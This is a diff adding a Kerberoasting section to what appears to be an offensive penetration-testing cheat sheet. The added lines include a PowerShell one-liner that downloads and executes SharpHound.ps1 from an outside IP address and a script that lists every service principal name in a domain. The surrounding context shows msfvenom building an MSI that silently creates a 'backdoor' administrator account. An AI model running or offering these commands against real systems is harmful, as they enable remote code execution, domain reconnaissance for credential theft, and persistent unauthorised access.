@@ -242,6 +242,36 @@ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
 msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 msiexec /quiet /qn /i C:\evil.msi
 ```
+# ATTACk - ACTIVE DIRECTORY
+## KERBEROASTING
+##### KERBEROASTING - FIND SPN
+```
+IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
+```
+##### KERBEROASTING - LIST ALL SPN
+```
+$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$MySearch.filter = "(servicePrincipalName=*)"
+$MyResults = $MySearch.Findall()
+
+foreach($result in $MyResults)
+{
+ $userEntry = $result.GetDirectoryEntry()
+ Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
+ Write-host "DN = "  $userEntry.distinguishedName
+ Write-host "Object Cat. = "  $userEntry.objectCategory
+ Write-host "servicePrincipalNames"
+ $i=1
+ foreach($SPN in $userEntry.servicePrincipalName)
+  {
+  Write-host "SPN(" $i ")   = "   $SPN
+  $i+=1
+  }
+  Write-host ""
+  }
+```
+
+
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
